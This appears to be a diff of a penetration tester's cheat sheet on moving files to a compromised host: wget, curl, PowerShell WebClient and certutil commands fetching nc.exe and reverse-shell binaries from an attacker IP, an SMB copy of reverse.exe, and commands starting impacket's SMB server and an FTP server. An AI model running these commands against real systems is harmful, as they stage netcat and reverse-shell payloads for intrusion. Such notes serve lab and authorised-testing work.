@@ -1,13 +1,13 @@
 wget http://10.11.0.106/nc.exe -O nc.exe
 curl http://10.11.0.106/nc.exe -o nc.exe
 ----------------------------------------------------------------------------------------------------------------------------------------------------------
-WINDOWS
-
+WINDOWS:
 1) powershell (New-Object System.Net.WebClient).DownloadFile("https://[attacker ip]/test.txt", "test.txt")
 2) certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
 3) Copy from SMB share: copy \\[attacker]\kali\reverse.exe C:\PrivEsc\reverse.exe
 ----------------------------------------------------------------------------------------------------------------------------------------------------------
-LINUX SMB SHARE
-
+LINUX SMB SHARE:
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
-
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+FTP:
+python -m pyftpdlib -p 21
